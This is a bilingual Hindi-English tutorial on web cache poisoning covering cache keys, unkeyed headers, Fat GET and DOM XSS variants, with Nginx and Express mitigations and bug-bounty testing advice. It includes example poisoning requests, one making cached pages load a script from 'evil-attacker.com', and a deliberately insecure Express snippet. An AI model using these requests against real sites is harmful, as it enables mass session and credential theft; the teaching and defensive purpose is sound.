Web Cache PoisoningWeb Cache Poisoning ek advanced web security attack hai jisme attacker ek aisi HTTP request craft karta hai jiska response malicious ho (jaise Stored XSS payload ya defacement), aur caching system (Cloudflare, Akamai, Varnish, Fastly) us response ko apne edge storage me save kar leta hai. Iske baad har innocent user jo us URL ko open karega, usko attacker ka malicious response deliver hota hai! is an advanced exploitation technique where an attacker crafts an HTTP request eliciting a dangerous response (e.g. Stored XSS payload or site defacement), tricking the web cache (Cloudflare, Akamai, Varnish) into storing it under a common Cache Key. Consequently, every subsequent legitimate visitor requesting that page receives the cached exploit!

Root cause hoti hai Cache Key vs Unkeyed Inputs ka mismatch: Caching proxy sirf method aur path (jaise GET /index.html) ko Cache Key banata hai, lekin application X-Forwarded-Host, X-Original-URL, ya unkeyed query parameters ko response HTML me render kar deti hai. Attacker sirf 1 request se hazaron users ko victim bana sakta hai! The root cause stems from the mismatch between Cache Keys and Unkeyed Inputs: The caching proxy hashes only the HTTP method and path into its Cache Key, while backend applications dynamically reflect unkeyed headers (like X-Forwarded-Host) into the page body. A single poisoned request compromises thousands of users globally!

1. Kyun Banayi Gayi? (The Architectural Problem Solved)1. Why Was It Engineered? (The Architectural Problem Solved)

Jab millions of global users ek website (e.g. e-commerce-portal.com) access karte hain, har request ko direct backend application aur database tak bhejna slow hota hai (high network latency, high CPU load, expensive SQL queries). Solution nikla: Edge Caching Proxies & CDNs (Content Delivery Networks). CDN servers geographically users ke paas hote hain. Jab pehla user request bhejta hai, CDN response ko save kar leta hai aur next 10,000 users ko direct RAM/Disk cache se serve kar deta hai bina origin database ko touch kiye! When millions of users globally visit an application, routing every single request back to the origin database causes massive latency spikes, CPU exhaustion, and slow page loads. The architectural remedy is Edge Caching Reverse Proxies & CDNs. Positioned close to users globally, CDNs save copies of web pages, serving thousands of subsequent requests directly from edge memory without burdening the origin server.

2. Kaise Kaam Karta Hai? (Under The Hood Mechanics)2. Under The Hood Mechanics (Cache Keys & Lifecycles)

Caching proxy decide karne ke liye ki do requests same hain ya alag, ek Cache Key create karti hai (usually HTTP Method + Host + Request URI). Baki sabhi headers (User-Agent, Cookies, X-Forwarded-Host) Unkeyed Inputs kehlate hain aur cache key hash me count nahi hote: To determine whether two incoming HTTP requests can share a cached response, the proxy computes a cryptographic Cache Key (typically Method + Host + Request Path). All other request headers (User-Agent, Cookies, custom headers) are Unkeyed Inputs and omitted from the cache key lookup: 

// Standard Cache Key Calculation:
Cache Key = Hash(HTTP_METHOD + "://" + HOST_HEADER + REQUEST_URI)
// Example: Hash("GET://example.com/products/view?id=42") -> 9b8d23fa01e

Agar incoming request ka hash already memory me hai, toh proxy origin ko bypass karke X-Cache: HIT header ke sath instant response return karti hai. Agar nahi hai, toh origin server se fetch karke X-Cache: MISS karti hai aur Cache-Control: max-age=3600 ke anusaar store kar leti hai. If the computed hash exists in edge memory, the CDN immediately returns the cached document stamped with X-Cache: HIT. If missing, it dispatches the request to origin (X-Cache: MISS) and caches the response dictated by Cache-Control: public, max-age=3600.

3. Kya Kya Vulnerabilities Milti Hain & Technical Examples3. What Vulnerabilities Emerge & Technical Examples

Jab backend origin kisi unkeyed input ko response body me execute ya reflect karta hai, toh yeh major vulnerability classes banti hain: When backend origin servers incorporate unkeyed inputs into cached responses, critical vulnerability classes emerge:

Vulnerability Class Underlying Failure Mechanism Technical Example
Unkeyed Header Reflection Backend reflects unkeyed headers (X-Forwarded-Host, X-Original-URL) in script imports. Attacker injects X-Forwarded-Host: evil.com; cached page serves <script src="//evil.com/app.js"> to all users!
Parameter Cloaking & Fat GET Proxy ignores request body on GET requests, but backend parses query parameters from both body and URL. Attacker sends GET with duplicate parameter in body; CDN caches poisoned response under clean URL key.
Cache Key Normalization Flaw Proxy decodes URL characters (e.g. %2f) while backend treats them as path traversal. Discrepancy causes administrative or forbidden content to be cached for unauthenticated public users.

Kayi frameworks (Express, Django, Rails) backend par JavaScript ya CSS resource URLs dynamically construct karte waqt X-Forwarded-Host ko check karte hain. Agar caching proxy is header ko cache key me include nahi karti, toh attacker poison inject karta hai: Many backend frameworks dynamically construct static asset script paths using X-Forwarded-Host. If front-end caching proxies exclude this header from the Cache Key, attackers execute a classic poisoning maneuver: 

// 1. Attacker Request (Cache Miss):
GET /en/home HTTP/1.1
Host: portal.company.com
X-Forwarded-Host: evil-attacker.com

// 2. Origin Server Generates Poisoned HTML:
HTTP/1.1 200 OK
Cache-Control: public, max-age=1800
X-Cache: MISS

<html>
  <script src="https://evil-attacker.com/static/bundle.js"></script>
</html>
⚠️ MASS XSS IMPACT

Ab agle 30 minute tak jitne bhi real users https://portal.company.com/en/home open karenge, unka browser CDN se wahi cached response receive karega! Har user ke browser me attacker ka malicious bundle.js execute hoga — mass session hijacking aur credentials theft! For the next 30 minutes, every genuine user visiting https://portal.company.com/en/home receives the poisoned edge cache entry! The attacker's malicious bundle.js executes in thousands of user browsers, yielding mass cookie theft!

Kuch frameworks (jaise Ruby on Rails ya PHP) GET requests me bhi HTTP body parameters ko parse kar lete hain ("Fat GET"). Caching proxies GET requests ki body ko completely ignore kar deti hain aur sirf URL path ko key banati hain: Certain web application frameworks inspect and parse form bodies even on GET requests ("Fat GET"). However, front-end caching proxies strictly evaluate only the query string in the request line, completely discarding request bodies when generating cache keys: 

// Fat GET Poison Request:
GET /catalog/items?category=shoes HTTP/1.1
Host: shop.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

category=shoes&callback=evilScript()

Proxy Cache Key banati hai: GET://shop.com/catalog/items?category=shoes. Backend server body ke parameter callback=evilScript() ko process karke response me inject kar deta hai. Innocent users jo simple shoes category browse karenge, unko poisoned response serve ho jayega! The proxy calculates the key for /catalog/items?category=shoes. Meanwhile, the backend prioritizes the body parameter callback=evilScript(), rendering an exploit into the response. Subsequent users browsing the standard shoes catalog execute the payload!

Modern Single Page Applications (React, Vue, Angular) frontend par dynamic JSON configuration files (e.g. /api/i18n/en.json) fetch karti hain. Agar attacker header tampering se is JSON data ke kisi unkeyed translation string me XSS payload daal de aur use cache karwa de, toh frontend application jab us JSON ko innerHTML me bind karegi, toh DOM XSS trigger hoga pure website par! Modern client-side Single Page Applications fetch static configuration and language bundles (e.g. /api/i18n/en.json). If an attacker seeds the cache of that JSON endpoint with an unkeyed payload, the client-side framework binds the untrusted string into the DOM via sinks like dangerouslySetInnerHTML, triggering persistent DOM XSS for all clients!

Web Cache Poisoning ko eliminate karne ke 3 fundamental rules: Three fundamental architectural rules to eliminate Web Cache Poisoning:

Defensive Layer Mitigation Strategy Production Implementation
Reverse Proxy Header Stripping Front-end reverse proxy par sabhi incoming client-supplied unkeyed headers ko drop karein. Nginx: proxy_set_header X-Forwarded-Host $host; (Overrides client input with authentic host).
Vary Header Pinning Agar koi header response ko change karta hai, toh use Vary header me shamil karein. Vary: Accept-Encoding, User-Agent, X-Requested-With (Forces separate cache entries).
Disable Fat GET Processing Backend server par GET requests me body payloads ko parse karna completely block karein. Reject or ignore HTTP request bodies when HTTP Method is GET or HEAD.

1. Nginx Reverse Proxy Header Override1. Nginx Reverse Proxy Header Override

# ❌ INSECURE: Blindly passing client-supplied X-Forwarded-Host to backend
proxy_set_header X-Forwarded-Host $http_x_forwarded_host;

# ✅ SECURE: Overwrite with authentic server hostname or drop untrusted headers
proxy_set_header X-Forwarded-Host $host;
proxy_hide_header X-Forwarded-Host; # Or strip completely if not required

2. Express.js / Node.js Host Configuration2. Express.js / Node.js Host Configuration

// ❌ INSECURE: Using client-supplied header to construct script URLs
app.get('/home', (req, res) => {
    const cdnHost = req.headers['x-forwarded-host'] || req.headers.host;
    res.send(`<script src="https://${cdnHost}/static/app.js"></script>`);
});

// ✅ SECURE: Use Hardcoded Static CDN Domain from Environment Config
const TRUSTED_CDN = process.env.CDN_DOMAIN || "static.company-assets.com";
app.get('/home', (req, res) => {
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.send(`<script src="https://${TRUSTED_CDN}/static/app.js"></script>`);
});

Agar aap production site par bina cache buster ke poison inject kar denge, toh real users ke liye site deface ya break ho sakti hai (out-of-scope damage). Cache Buster (jaise /page?mybuster=test1) ek unique cache key create karta hai jisse aapka test response sirf aapke unique URL par cache hota hai aur public users harm nahi hote! If you inject payloads without a cache buster, you risk poisoning the live production homepage for genuine users, violating bug bounty rules. Appending a random query parameter creates a fresh isolated cache key, allowing safe verification without impacting real users!
Vary: X-Forwarded-Host proxy ko instruct karta hai ki har alag header value ke liye alag cache entry banao. Jab attacker evil.com bhejega, toh wo sirf evil.com walon ko dikhega, aur normal users jinka header normal hai unko clean cache milegi! The Vary header tells edge caches to incorporate specific request headers into the Cache Key calculation. If an attacker injects evil.com, the cached payload is bound strictly to requests carrying that exact header value, protecting regular visitors!
Web Cache Poisoning me attacker cache me MALICIOUS DATA DALTA HAI jo doosre users ko harm karta hai. Web Cache Deception me attacker victim ko trick karke VICTIM KA SENSITIVE DATA (profile, credit cards) cache karwata hai aur fir attacker khud use public cache se read kar leta hai! In Cache Poisoning, the attacker pushes malicious data INTO the cache to harm visitors. In Cache Deception, the attacker tricks the victim into saving their own private account data into a public cache for the attacker to steal!
